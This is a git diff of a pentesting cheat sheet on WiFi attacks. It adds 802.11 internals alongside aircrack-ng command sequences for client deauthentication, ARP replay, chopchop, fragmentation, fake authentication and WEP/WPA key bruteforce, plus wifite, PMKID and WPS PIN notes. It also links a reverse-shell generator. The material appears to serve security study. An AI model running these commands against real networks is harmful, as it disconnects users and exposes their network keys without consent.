@@ -26,7 +26,7 @@
 - [Ngrok](https://ngrok.com/), [Serveo](https://serveo.net), [Collaborative - cat.flag.sh](https://cat.flag.sh), [Tunnel (Wiregard)](https://tunnel.pyjam.as/)
 - [Revshells](https://revshells.com)
 - [Tshark](https://tshark.dev/)
-- [Wifite](https://github.com/derv82/wifite)
+- [Wifite2](https://github.com/kimocoder/wifite2)
 
 ### Captures / Challenges
 
@@ -132,18 +132,11 @@ dnscrypt-proxy -config /etc/dnscrypt-proxy/dnscrypt-proxy.toml -resolve example.
 ` Bypass dns [.-a-z]`
 
 - https://nip.io/ 
-
 - https://web-check.as93.net/
-	`External tools & more`
-
-	- https://dnsdumpster.com/ (map)
-
-	- https://search.censys.io/
-
-	- https://www.ssllabs.com/ssltest/
-
+- https://dnsdumpster.com/ (map)
+- https://search.censys.io/
+- https://www.ssllabs.com/ssltest/
 - https://subdomainfinder.c99.nl/
-
 - https://www.duckdns.org/
 
 ```bash
@@ -300,6 +293,17 @@ firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulne
 sudo wifite -mac --keep-ivs --ignore-locks -ic --pmkid-timeout 600 --v # --kill -inf -p 3600 --bully
 ```
 
+### Internals
+
+- Implementation (Linux) with `wpa_supplicant -h` or `NetworkManager -h`
+- **RSN**: Robust security Networks (**802.11i**), (since TKIP/CCMP for PSK)
+- **802.1X**: Port-based Network Access Control: supplicant (station/client), authenticator/controller (Access Point if Wifi) & authentication server (Radius if MGT)
+- **802.11 (WIFI)**: Different norms for **channels** : 802.11a/b/g/n/ac/ad/ax
+- **BSSID**: Access Point MAC, ESSID: Access Point Name, STATION MAC: MAC of 1 AP's Client, MAC: Personal MAC (`macchanger -s wlan1mon`)
+- 2 modes for WPA/WPA2: **PSK** (Personal AP) and **Enterprise/MGT** (Enterprise AP with **Radius** server)
+- 2 modes for WPA3: **SAE** and **Enterprise**
+- Enterprise mode: Client <-- EAP (TLS,TTLS,PEAP,Kerberos,SIM)--> AP <-- PSK or SAE --> Radius server
+
 ### Man In The Middle
 
 - https://security.stackexchange.com/questions/225985/is-there-any-point-of-arp-spoofing-on-a-wifi-network
@@ -312,7 +316,7 @@ sudo iw wlanx info
 sudo wireshark&
 ```
 
-### WEP & WPA (4 way handshake with TKIP => RC4)
+### WEP, WPA-PSK (4 way handshake with TKIP => RC4)
 
 - https://www.aircrack-ng.org/doku.php?id=cracking_wpa
 - https://dl.aircrack-ng.org/breakingwepandwpa.pdf
@@ -323,6 +327,7 @@ wlan.fc.type_subtype == 0x0020
 ```
 
 #### Authentification
+
 ```txt
 response = challenge ^ RC4(iv|psk)
 
@@ -332,38 +337,113 @@ psk = 5 chars = 40 bits <-> key = iv|psk = 64 bits
 psk = 13 chars = 104 bits <-> key = iv|psk = 128 bits
 ```
 
-#### Capture
+#### Capture & Deauth
 
 ```bash
-sudo su
-airmon-ng start wlan0 #set monitor & rename wlan0 (wlan0mon)
-airodump-ng wlan0mon #scan network
-airodump-ng --bssid 68:A3:78:01:C9:EF -w wep wlan0mon #find bssid (last command) , -w = prefix name
-airodump-ng stop wlan0mon #set back monitor->managed
+airmon-ng start wlan1 #set monitor & rename wlan0 (wlan0mon)
+airodump-ng wlan1mon #scan network
+airodump-ng --bssid <BSSID> -w wep wlan1mon # capture from bssid (last command) , -w = prefix name
+
+aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon
+```
+
+```bash
+# WEP
+aireplay-ng  --help
+#  Attack modes (numbers can still be used):
+#
+#      --deauth      count : deauthenticate 1 or all stations (-0)
+#      --fakeauth    delay : fake authentication with AP (-1)
+#      --interactive       : interactive frame selection (-2)
+#      --arpreplay         : standard ARP-request replay (-3)
+#      --chopchop          : decrypt/chopchop WEP packet (-4)
+#      --fragment          : generates valid keystream   (-5)
+#      --caffe-latte       : query a client for new IVs  (-6)
+#      --cfrag             : fragments against a client  (-7)
+#      --migmode           : attacks WPA migration mode  (-8)
+#      --test              : tests injection and quality (-9)
+
+# WPA-PSK
+tkiptun-ng --help
+```
+#### Capture & ARP Request Replay
+
+```bash
+# Using appropriate channel found using airodump-ng for the 1st time
+airmon-ng stop wlan1mon
+airmon-ng start wlan1 <CHANNEL>
+airodump-ng --bssid <BSSID> -w wep wlan1mon
+
+aireplay-ng -3 -b <BSSID> -h <STATION MAC> -x 600 wlan1mon
+```
+
+
+#### Korek ChopChop attack
+
+```bash
+# airodump-ng --bssid <BSSID> -w wep wlan1mon
+
+aireplay-ng -4 -b <BSSID> -h <STATION MAC> wlan1mon
+```
+
+#### Fragmentation attack
+
+```bash
+# airodump-ng --bssid <BSSID> -w wep wlan1mon
+
+aireplay-ng -5 -b <BSSID> -h <STATION MAC> <interface>
+packetforge-ng -0 -a <BSSID> -h <STATION MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
+aireplay-ng -2 -r <packet filename> wlan1mon
+```
+
+#### Client-Less Fake Authentication
+
+```bash
+# airodump-ng --bssid <BSSID> -w wep wlan1mon
+# Using Fake/Usurpated MAC 0:1:2:3:4:5
+
+aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h 0:1:2:3:4:5 wlan1mon
 ```
 
 #### Tests & Bruteforce
 
 ```bash
+# w = hex key, testing if len(key) = 13
+airdecap-ng -w $(python3 -c "import sys;sys.stdout.buffer.write(b'A'*13)"|xxd -ps) -b  <BSSID> wep-01.cap
+
+# If len fails:
+#Invalid WEP key length. [5,13,16,29,61]
+#"airdecap-ng --help" for help.
+```
+
+```bash
 # -a 1 = wep (default)
-# -k = korek attack , -z = ptw attack
-airdecap-ng -w $(echo "0123456789012" |xxd -ps) -b 68:A3:78:01:C9:EF  wep-01.cap	#w = hex key, testing with 13 chars
-aircrack-ng -w rockyou.txt -b 68:A3:78:01:C9:EF -n 128 wep-01.cap					#n = length key. If len(hex_key)=13 then n = 128
+# -k = korek attack (inspired by FMS), -z = ptw attack (default)
+
+# -n = length key. If len(hex_key)=13 then n = 128
+aircrack-ng -w rockyou.txt -b <BSSID> -n 128 wep-01.cap
+
+# set interface back to managed mode
+# airodump-ng stop wlan1mon
 ```
 
 ### WPA/WPA2 (4way handshake with CCMP = AES 128 CBC-MAC)
 
 - https://www.wifi-professionals.com/2019/01/4-way-handshake
 
-#### Deauth + 4 way handshake capture + Bruteforce
+#### Capture 4-way handshake, Deauth & Bruteforce
 
 **Aircrack**
 
 ```bash
-aireplay -0 5 -a <BSSID> -c <Dest MAC> wlan1mon
+#airmon-ng stop wlan1mon
+#airmon-ng start wlan1 <CHANNEL>
+
+airodump-ng --bssid <BSSID> -w wpa wlan1mon #find bssid (last command) , -w = prefix name
+aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon
 
 # -a 2 = wpa-psk
-aircrack-ng -a 2 -w rockyou.txt -b 68:A3:78:01:C9:EF wpa-01.cap
+aircrack-ng -a 2 -w rockyou.txt -b <BSSID> wpa-01.cap
 ```
 
 **Bettercap**
@@ -378,17 +458,24 @@ wpapcap2john bettercap-wifi-handshakes.pcap
 **Wifite**
 
 ```bash
-sudo wifite --crack --dict SecLists/Passwords/darkc0de.txt # aircrack, john, hashcat (all bf including PMKID), cowpatty (depreciated)
+sudo wifite --crack --dict ~/SecLists/Passwords/darkc0de.txt # aircrack, john, hashcat (all bf including PMKID), cowpatty (depreciated)
 ```
 
-#### PMKID & WPS PIN attacks
+#### Client-Less PMKID attack
 
 - https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/
+- Included in **wifite2**
 
 #### KRACK
 
 - https://beta.hackndo.com/krack/
 - https://www.krackattacks.com/
+
+#### WPS Pin attacks
+
+- Pixie-Dust & Pin bf attack: `reaver`, `bully`
+- NULL Pin: `reaver`
+- Included in **wifite2**
 
 ### WPA2-EAP | WPA-MGT (Entreprise)
 
